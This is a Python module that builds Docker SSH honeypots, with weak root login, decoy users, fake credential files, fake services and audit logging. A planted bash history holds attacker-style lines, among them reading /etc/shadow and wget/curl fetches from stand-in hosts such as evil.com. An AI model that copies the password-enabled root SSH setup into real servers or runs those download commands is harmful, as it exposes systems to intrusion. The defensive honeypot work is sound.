#!/usr/bin/env python3
"""
AI-Driven Containerized Honeypot - Phase 1
Container Management & Configuration Module

This module handles Docker container creation, SSH configuration,
and fake data injection for the honeypot system.
"""

import docker
import os
import subprocess
from datetime import datetime
import tarfile
import io
import hashlib

class HoneypotContainer:
    """Manages a single honeypot container"""
    
    def __init__(self, container_id):
        self.client = docker.from_env()
        self.container = self.client.containers.get(container_id)
        print(f"  ✓ Container loaded: {container_id[:12]}")
        
    def configure_ssh(self):
        """Configure SSH service in container"""
        print("  ⚙️  Configuring SSH...")
        
        # Update and install SSH
        self.exec_cmd('apt update && apt install -y openssh-server nano vim wget curl')
        
        # Configure SSH to allow root login with password
        self.exec_cmd('mkdir -p /var/run/sshd')
        self.exec_cmd('echo "root:password123" | chpasswd')
        
        # Modify SSH config
        self.exec_cmd('sed -i "s/#PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config')
        self.exec_cmd('sed -i "s/#PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config')
        self.exec_cmd('sed -i "s/#PubkeyAuthentication.*/PubkeyAuthentication no/" /etc/ssh/sshd_config')
        
        # Start SSH daemon
        self.exec_cmd('/usr/sbin/sshd')
        self.exec_cmd('service ssh start')
        
        print("  ✓ SSH configured (root:password123)")
        
    def add_fake_users(self, users):
        """Add fake user accounts with roles"""
        print("  👥 Adding fake users...")
        
        for username, password, role in users:
            # Create user
            self.exec_cmd(f'useradd -m -s /bin/bash {username}')
            self.exec_cmd(f'echo "{username}:{password}" | chpasswd')
            
            # Add to sudo group if admin
            if role == 'admin':
                self.exec_cmd(f'usermod -aG sudo {username}')
                print(f"    - {username} (admin)")
            else:
                print(f"    - {username} ({role})")
                
        print("  ✓ Users added successfully")
        
    def inject_sensitive_files(self):
        """Inject fake sensitive files that attackers look for"""
        print("  📄 Injecting sensitive files...")
        
        fake_files = {
            '/root/.ssh/id_rsa': self._generate_fake_ssh_key(),
            '/root/.aws/credentials': self._generate_fake_aws_creds(),
            '/home/admin/.env': self._generate_fake_env(),
            '/etc/mysql/my.cnf': self._generate_fake_mysql_config(),
            '/var/www/html/config.php': self._generate_fake_php_config(),
            '/tmp/debug.log': self._generate_fake_debug_log(),
            '/home/admin/.git-credentials': self._generate_fake_git_creds(),
            '/root/.kube/config': self._generate_fake_kube_config()
        }
        
        for filepath, content in fake_files.items():
            self._write_file_to_container(filepath, content)
            
        print(f"  ✓ {len(fake_files)} sensitive files injected")
        
    def _write_file_to_container(self, filepath, content):
        """Write a file to the container"""
        # Create directory if needed
        dirname = os.path.dirname(filepath)
        if dirname:
            self.exec_cmd(f'mkdir -p {dirname}')
            
        # Write file content
        self.exec_cmd(f'cat > {filepath} << \'EOF\'\n{content}\nEOF')
        
        # Set realistic permissions
        if 'id_rsa' in filepath or 'credentials' in filepath or 'config' in filepath:
            self.exec_cmd(f'chmod 600 {filepath}')
        elif '.env' in filepath:
            self.exec_cmd(f'chmod 644 {filepath}')
        else:
            self.exec_cmd(f'chmod 644 {filepath}')
            
    def _generate_fake_ssh_key(self):
        """Generate fake SSH private key"""
        return """-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBxK8J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5AAAAdgAAACBxK
8J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5J5AAAAC3NzaC1lZDI1NTE5AAAAIBFq
ZmJhc2RmZ2hqa2xsem5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwYWJjZGVmZ2hqa2xzbm9wcXJz
dHV2d3h5ejAxMjM0NTY3ODkwYWJjZGVmZ2hqa2xzbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkw
YWJjZGVmZ2hqa2xzbm9wcXJzdHV2d3h5ejAxMjM0NQAAAEC
-----END OPENSSH PRIVATE KEY-----"""
        
    def _generate_fake_aws_creds(self):
        """Generate fake AWS credentials"""
        return """[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1

[profile production]
aws_access_key_id = AKIAIOSFODNN7PRODKEY
aws_secret_access_key = productionSecretKey123456789EXAMPLE
region = us-west-2
"""
        
    def _generate_fake_env(self):
        """Generate fake .env file"""
        return """# Database Configuration
DB_HOST=localhost
DB_PORT=3306
DB_USER=admin
DB_PASS=SuperSecret123!
DB_NAME=production_db

# API Keys
API_KEY=sk-1234567890abcdef
SECRET_KEY=your-256-bit-secret-key-here
JWT_SECRET=jwt_super_secret_key_do_not_share

# AWS Credentials
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_REGION=us-east-1

# Redis
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=redispassword123

# Admin Credentials
ADMIN_EMAIL=admin@example.com
ADMIN_PASSWORD=Admin@123456
"""
        
    def _generate_fake_mysql_config(self):
        """Generate fake MySQL configuration"""
        return """[mysqld]
user = mysql
pid-file = /var/run/mysqld/mysqld.pid
socket = /var/run/mysqld/mysqld.sock
port = 3306
basedir = /usr
datadir = /var/lib/mysql
tmpdir = /tmp
bind-address = 127.0.0.1
skip-networking = 0
max_connections = 151
table_open_cache = 4000
max_allowed_packet = 16M
key_buffer_size = 32M
myisam_sort_buffer_size = 8M
sort_buffer_size = 512K
read_buffer_size = 256K
read_rnd_buffer_size = 512K
thread_stack = 128K
thread_cache_size = 2
query_cache_limit = 1M
query_cache_size = 16M
query_cache_type = 1
tmp_table_size = 32M
max_heap_table_size = 32M
binlog_format = mixed
log_error = /var/log/mysql/error.log
slow_query_log = 1
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 2
server-id = 1
"""
        
    def _generate_fake_php_config(self):
        """Generate fake PHP configuration"""
        return """<?php
// Database Configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', 'rootpassword123');
define('DB_NAME', 'website_db');

// Admin Credentials
define('ADMIN_USER', 'admin');
define('ADMIN_PASS', 'admin123');

// API Keys
define('GOOGLE_API_KEY', 'AIzaSyExampleAPIKey123456');
define('STRIPE_SECRET', 'sk_test_1234567890abcdef');

// Secret Keys
define('AUTH_KEY', 'Your-Authorization-Secret-Key-Here');
define('SECURE_AUTH_KEY', 'Your-Secure-Auth-Secret-Key-Here');
define('LOGGED_IN_KEY', 'Your-LoggedIn-Secret-Key-Here');
define('NONCE_KEY', 'Your-Nonce-Secret-Key-Here');
define('AUTH_SALT', 'Your-Auth-Salt-Here');
?>
"""
        
    def _generate_fake_debug_log(self):
        """Generate fake debug log"""
        return """[2026-04-09 10:23:45] DEBUG: System initialized
[2026-04-09 10:23:46] INFO: Loading configuration...
[2026-04-09 10:23:47] DEBUG: Database connection established
[2026-04-09 10:23:48] INFO: User admin logged in from 192.168.1.100
[2026-04-09 10:24:15] DEBUG: Processing request for /api/data
[2026-04-09 10:24:16] WARNING: High memory usage detected (85%)
[2026-04-09 10:25:00] INFO: Scheduled backup started
[2026-04-09 10:25:30] DEBUG: Backup completed successfully
[2026-04-09 10:30:00] ERROR: Failed to connect to external API
[2026-04-09 10:30:01] DEBUG: Retrying connection...
[2026-04-09 10:30:02] INFO: Connection restored
"""
        
    def _generate_fake_git_creds(self):
        """Generate fake Git credentials"""
        return """https://oauth2:ghp_1234567890abcdefghijklmnop@github.com
https://x-access-token:github_pat_1234567890abcdefghijklmnop@github.com
"""
        
    def _generate_fake_kube_config(self):
        """Generate fake Kubernetes config"""
        return """apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR...
    server: https://192.168.1.100:6443
  name: production-cluster
contexts:
- context:
    cluster: production-cluster
    namespace: default
    user: admin
  name: admin@production-cluster
current-context: admin@production-cluster
kind: Config
preferences: {}
users:
- name: admin
  user:
    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkZaVlUyTDFN...
"""
        
    def inject_fake_logs(self):
        """Inject fake system logs to look realistic"""
        print("  📝 Injecting fake logs...")
        
        # Fake auth log
        auth_log = """Apr  9 10:23:45 honeypot sshd[1234]: Accepted password for root from 192.168.1.100 port 54321 ssh2
Apr  9 10:24:00 honeypot sshd[1235]: Accepted password for admin from 10.0.0.50 port 12345 ssh2
Apr  9 10:25:15 honeypot sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Apr  9 10:30:22 honeypot sshd[1236]: Failed password for invalid user test from 203.0.113.42 port 33445 ssh2
Apr  9 10:30:25 honeypot sshd[1237]: Failed password for invalid user admin123 from 203.0.113.42 port 33446 ssh2
"""
        self._write_file_to_container('/var/log/auth.log', auth_log)
        
        # Fake bash history
        bash_history = """ls
cd /root
cat /etc/passwd
sudo su
ps aux
netstat -tulpn
cat /etc/shadow
find / -name "*.key"
wget http://malicious.com/malware.sh
curl -O http://evil.com/backdoor
history
"""
        self._write_file_to_container('/root/.bash_history', bash_history)
        
        print("  ✓ Logs injected successfully")
        
    def setup_fake_services(self):
        """Setup fake services that look real"""
        print("  🛠️  Setting up fake services...")
        
        # Create fake MySQL database with sensitive data
        self.exec_cmd('apt install -y mysql-server 2>/dev/null || true')
        self.exec_cmd('mysql -e "CREATE DATABASE IF NOT EXISTS fake_db;" 2>/dev/null || true')
        self.exec_cmd('mysql -e "USE fake_db; CREATE TABLE IF NOT EXISTS users (id INT, username VARCHAR(50), password VARCHAR(255));" 2>/dev/null || true')
        self.exec_cmd('mysql -e "USE fake_db; INSERT IGNORE INTO users VALUES (1, \'admin\', \'password123\'), (2, \'root\', \'root123\'), (3, \'user\', \'user123\');" 2>/dev/null || true')
        
        # Create fake Redis data
        self.exec_cmd('apt install -y redis-server 2>/dev/null || true')
        self.exec_cmd('redis-cli SET admin:password "fake_admin_password" 2>/dev/null || true')
        self.exec_cmd('redis-cli SET session:data "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==" 2>/dev/null || true')
        
        # Create fake web directory with sensitive files
        self.exec_cmd('mkdir -p /var/www/html/admin')
        self.exec_cmd('echo "Admin Panel - Password: admin123" > /var/www/html/admin/login.php')
        
        print("  ✓ Fake services configured")
        
    def enable_audit_logging(self):
        """Enable comprehensive logging of all activities"""
        print("  🔍 Enabling audit logging...")
        
        # Install auditd if available
        self.exec_cmd('apt install -y auditd 2>/dev/null || true')
        
        # Monitor sensitive files and commands
        audit_rules = [
            '-a exit,always -F arch=b64 -S execve',  # Monitor all commands
            '-w /etc/passwd -p wa',  # Monitor /etc/passwd
            '-w /etc/shadow -p wa',  # Monitor /etc/shadow
            '-w /root/.ssh -p wa',  # Monitor SSH keys
            '-w /home -p wa',  # Monitor home directories
        ]
        
        for rule in audit_rules:
            self.exec_cmd(f'auditctl {rule} 2>/dev/null || true')
            
        self.exec_cmd('service auditd start 2>/dev/null || true')
        
        print("  ✓ Audit logging enabled")
        
    def exec_cmd(self, command):
        """Execute a command in the container"""
        result = self.container.exec_run(command, demux=True)
        if result.exit_code != 0:
            # Log but don't fail - some commands might have expected errors
            pass
        return result
        
    def get_logs(self, tail=100):
        """Get container logs"""
        return self.container.logs(tail=tail).decode()
        
    def stop(self):
        """Stop the container"""
        self.container.stop()
        print(f"  ✓ Container stopped: {self.container.name}")
        
    def remove(self):
        """Remove the container"""
        self.container.remove()
        print(f"  ✓ Container removed: {self.container.name}")


class HoneypotManager:
    """Manages multiple honeypot containers"""
    
    def __init__(self):
        self.client = docker.from_env()
        self.containers = {}
        print("🚀 Honeypot Manager initialized")
        print(f"   Docker version: {self.client.version()['Version']}")
        
    def create_honeypot(self, profile="default", port=2222):
        """Create a new containerized honeypot"""
        print(f"\n📦 Creating honeypot container (profile: {profile})...")
        
        # Generate unique name
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        container_name = f"honeypot-{profile}-{timestamp}"
        
        # Create container from Ubuntu 22.04
        try:
            container = self.client.containers.run(
                "ubuntu:22.04",
                command=["/bin/bash", "-c", "while true; do sleep 1; done"],  # Keep container running
                name=container_name,
                ports={22: port},  # Container port 22 → Host port (2222, etc.)
                detach=True,
                mem_limit="512m",  # Limit to 512MB (changed from 'memory')
                nano_cpus=500000000,  # Limit to 0.5 CPU (changed from 'cpus')
            )
            print(f"  ✓ Container created: {container_name}")
            
        except Exception as e:
            print(f"  ✗ Error creating container: {e}")
            return None
            
        # Configure the honeypot
        honeypot = HoneypotContainer(container.id)
        
        # Run configuration steps
        honeypot.configure_ssh()
        
        # Add fake users based on profile
        if profile == "dev-server":
            honeypot.add_fake_users([
                ("admin", "admin123", "admin"),
                ("root", "password123", "admin"),
                ("developer", "dev123", "developer"),
                ("git", "git123", "developer")
            ])
        elif profile == "db-server":
            honeypot.add_fake_users([
                ("admin", "admin123", "admin"),
                ("mysql", "mysql123", "admin"),
                ("postgres", "postgres123", "admin")
            ])
        else:  # default
            honeypot.add_fake_users([
                ("admin", "admin123", "admin"),
                ("root", "password123", "admin")
            ])
        
        honeypot.inject_sensitive_files()
        honeypot.inject_fake_logs()
        honeypot.setup_fake_services()
        honeypot.enable_audit_logging()
        
        # Store reference
        self.containers[container.id] = {
            'honeypot': honeypot,
            'container': container,
            'profile': profile,
            'port': port,
            'created': datetime.now()
        }
        
        print(f"\n✅ Honeypot ready!")
        print(f"   Name: {container_name}")
        print(f"   Port: {port}")
        print(f"   Profile: {profile}")
        print(f"   Access: ssh -p {port} root@localhost")
        print(f"   Password: password123")
        
        return container
        
    def list_containers(self):
        """List all active honeypot containers"""
        print("\n📋 Active Honeypot Containers:")
        print("=" * 60)
        for container_id, info in self.containers.items():
            container = info['container']
            status = container.status
            print(f"  {info['profile']:15} | Port: {info['port']:5} | {container.name[:30]:30} | {status}")
        print("=" * 60)
        
    def destroy_honeypot(self, container_id):
        """Destroy a honeypot container"""
        if container_id in self.containers:
            info = self.containers[container_id]
            container = info['container']
            
            print(f"\n🗑️  Destroying container: {container.name}")
            
            # Stop container
            container.stop()
            
            # Remove container
            container.remove()
            
            # Remove from tracking
            del self.containers[container_id]
            
            print(f"  ✓ Container destroyed")
        else:
            print(f"  ✗ Container not found: {container_id}")
            
    def destroy_all(self):
        """Destroy all honeypot containers"""
        print("\n🗑️  Destroying all honeypot containers...")
        for container_id in list(self.containers.keys()):
            self.destroy_honeypot(container_id)
        print(f"\n✓ All containers destroyed")


if __name__ == "__main__":
    import sys
    
    print("=" * 60)
    print("AI-Driven Containerized Honeypot - Phase 1")
    print("Testing Basic Container Creation")
    print("=" * 60)
    
    # Initialize manager
    manager = HoneypotManager()
    
    # Create test honeypot
    print("\n🎯 Creating test honeypot...")
    container = manager.create_honeypot("test", 2224)
    
    if container:
        print(f"\n📝 Container ID: {container.id[:12]}")
        print(f"📝 Container Name: {container.name}")
        print("\n" + "=" * 60)
        print("Test successful! Container is ready for SSH connections.")
        print("=" * 60)
        print("\nTo test manually:")
        print(f"  ssh -p 2222 root@localhost")
        print("  Password: password123")
        print("\nSkipping wait - container will be destroyed automatically")
        # input("\nPress Enter to destroy container...")
        
        # Clean up
        manager.destroy_all()
    else:
        print("\n❌ Failed to create container")
        sys.exit(1)
